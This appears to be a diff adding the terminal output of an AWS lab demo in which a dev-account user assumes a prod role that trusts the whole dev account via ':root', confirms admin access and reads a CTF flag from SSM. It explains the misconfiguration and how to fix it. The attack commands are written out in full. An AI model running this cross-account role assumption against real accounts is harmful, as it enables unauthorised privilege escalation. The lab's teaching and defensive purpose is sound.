@@ -1,0 +1,140 @@
+[0;32m========================================[0m
+[0;32mCross-Account Root Trust Role Assumption Demo[0m
+[0;32m========================================[0m
+
+[1;33mStep 1: Retrieving scenario configuration from Terraform[0m
+Retrieved access key for: pl-dev-xsarrt-to-admin-starting-user
+Access Key ID: AKIA4E6H5H...
+ReadOnly Key ID: AKIA4E6H5H...
+Target Role ARN: arn:aws:iam::123456789012:role/pl-prod-xsarrt-to-admin-target-role
+Region: us-east-1
+[0;32m✓ Retrieved configuration from Terraform[0m
+
+[1;33m[demo_permissions] Restricting helpful permissions for validation...[0m
+[1;33m[demo_permissions] Waiting 15s for IAM policy propagation...[0m
+[0;32m[demo_permissions] Helpful permissions restricted[0m
+[1;33mStep 2: Configuring AWS CLI with starting user credentials (dev account)[0m
+Using region: us-east-1
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:iam::123456789012:user/pl-dev-xsarrt-to-admin-starting-user
+[0;32m✓ Verified starting user identity in dev account[0m
+
+[1;33mStep 3: Identifying dev and prod accounts[0m
+[2m[ReadOnly] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Dev Account ID: 123456789012
+Prod Account ID: 123456789012
+[0;32m✓ Extracted account IDs[0m
+
+[1;33mStep 4: Examining trust policy of target role[0m
+[0;31m⚠️  CRITICAL SECURITY ISSUE IDENTIFIED ⚠️[0m
+
+The prod target role trusts the ENTIRE dev account via :root principal:
+
+[0;34mTrust Policy Principal:[0m
+  {"AWS": "arn:aws:iam::123456789012:root"}
+
+[0;31mSecurity Impact:[0m
+  • ANY principal in dev account with sts:AssumeRole can assume this role
+  • This includes: ALL IAM users, ALL IAM roles, ALL federated users
+  • The :root principal grants account-wide trust, not just specific principals
+
+[1;33mBest Practice:[0m
+  • Trust specific principals instead: arn:aws:iam::123456789012:role/specific-role
+  • Add conditions to restrict which principals can assume the role
+  • Use aws:PrincipalArn or aws:PrincipalOrgID conditions
+
+[0;32m✓ Trust policy analyzed[0m
+
+[1;33mStep 5: Verifying we don't have admin access in prod yet[0m
+Attempting to list IAM users in prod account (should fail)...
+[2m[Attacker] $ aws iam list-users --max-items 1[0m
+[0;32m✓ Confirmed: Cannot list IAM users (as expected)[0m
+
+[1;33mStep 6: Assuming the target role in prod account[0m
+Target Role ARN: arn:aws:iam::123456789012:role/pl-prod-xsarrt-to-admin-target-role
+
+Because the role trusts :root, we can assume it with our basic user credentials...
+
+
+[0;36m[Attacker] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-xsarrt-to-admin-target-role --role-session-name root-trust-demo-session --query 'Credentials' --output json[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Account' --output text[0m
+Current identity: arn:aws:sts::123456789012:assumed-role/pl-prod-xsarrt-to-admin-target-role/root-trust-demo-session
+Current Account ID: 123456789012
+[0;32m✓ Successfully assumed role in prod account[0m
+
+[1;33mStep 7: Verifying administrator access in prod account[0m
+Attempting to list IAM users...
+[2m[ReadOnly] $ aws iam list-users --max-items 3 --output table[0m
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|                                                                                    ListUsers                                                                                   |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+|  NextToken                 |  eyJNYXJrZXIiOiBudWxsLCAiYm90b190cnVuY2F0ZV9hbW91bnQiOiAzfQ==                                                                                     |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+||                                                                                     Users                                                                                    ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||                             Arn                             |      CreateDate       |   PasswordLastUsed    | Path  |        UserId          |           UserName            ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582225 |  2026-03-03T23:57:05Z |                       |  /    |  AIDA2E4JP2KMDN764OVDX |  pathrunner-admin-1772582225  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582487 |  2026-03-04T00:01:27Z |                       |  /    |  AIDA2E4JP2KMIGZOBA63O |  pathrunner-admin-1772582487  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582552 |  2026-03-04T00:02:32Z |  2026-03-04T00:04:42Z |  /    |  AIDA2E4JP2KMGNBJR4AJO |  pathrunner-admin-1772582552  ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+[0;32m✓ Successfully listed IAM users![0m
+[0;32m✓ ADMIN ACCESS CONFIRMED IN PROD ACCOUNT[0m
+
+[1;33mStep 8: Capturing CTF flag from SSM Parameter Store[0m
+
+[0;36m[Attacker (prod admin role)] $ aws ssm get-parameter --name /pathfinding-labs/flags/root-trust-role-assumption-to-admin --query 'Parameter.Value' --output text[0m
+[0;32m✓ Flag captured: flag{root_trust_cross_account_admin_captured}[0m
+
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-xsarrt-to-admin-target-role --role-session-name root-trust-demo-session --query 'Credentials' --output json[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/root-trust-role-assumption-to-admin --query 'Parameter.Value' --output text[0m
+[1;33m[demo_permissions] Restoring helpful permissions...[0m
+  Restored user: pl-dev-xsarrt-to-admin-starting-user
+[0;32m[demo_permissions] Helpful permissions restored[0m
+
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-dev-xsarrt-to-admin-starting-user in dev account (835253518153)
+2. Identified: Prod role trusts :root (entire dev account)
+3. Assumed role: pl-prod-xsarrt-to-admin-target-role in prod account (697683661464)
+4. Achieved: Administrative access in prod account
+5. Captured CTF flag from SSM Parameter Store: flag{root_trust_cross_account_admin_captured}
+
+[1;33mCross-Account Attack Path:[0m
+dev:pl-dev-xsarrt-to-admin-starting-user → (sts:AssumeRole) → prod:pl-prod-xsarrt-to-admin-target-role → admin access → (ssm:GetParameter) → CTF Flag
+
+[0;31m⚠️  CRITICAL SECURITY FINDING ⚠️[0m
+[0;31mThe target role trusts 'arn:aws:iam::123456789012:root'[0m
+
+This means that ANY of the following could perform this exact attack:
+  • ANY IAM user in dev account with sts:AssumeRole permission
+  • ANY IAM role in dev account with sts:AssumeRole permission
+  • ANY federated user in dev account with sts:AssumeRole permission
+  • ANY EC2 instance with an instance profile in dev account
+  • ANY Lambda function with an execution role in dev account
+
+The :root principal grants account-wide trust, vastly expanding the attack surface.
+
+[1;33mAttack Artifacts:[0m
+- No persistent artifacts created
+- Role assumption created temporary session credentials that will expire
+
+[0;34mℹ This demonstrates why trusting :root is a critical security misconfiguration[0m
+[0;34mAn attacker compromising ANY principal in dev can gain admin access to prod[0m
+
+[1;33mRecommended Remediation:[0m
+1. Replace :root trust with specific principal ARNs
+2. Add aws:PrincipalArn conditions to restrict assumable roles
+3. Use aws:PrincipalOrgID to limit trust to specific AWS Organizations
+4. Implement least privilege - only grant trust to principals that need it
+
+[1;33mTo clean up (no cleanup needed for this scenario):[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
+[0;31m  Failed to restrict user: pl-dev-xsarrt-to-admin-starting-user[0m
